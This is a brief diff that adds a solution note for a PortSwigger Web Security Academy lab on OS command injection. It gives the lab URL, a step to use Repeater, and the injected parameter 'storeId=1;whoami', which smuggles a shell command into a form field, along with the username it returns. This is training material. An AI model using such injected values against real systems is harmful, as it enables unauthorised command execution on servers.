@@ -1,0 +1,8 @@
+[lab: OS command injection, simple case]
+url: https://portswigger.net/web-security/os-command-injection/lab-simple
+solution:
+    step-1: open repeater
+    step-2: productId=1&storeId=1;whoami
+
+    response: peter-CS24tR
+
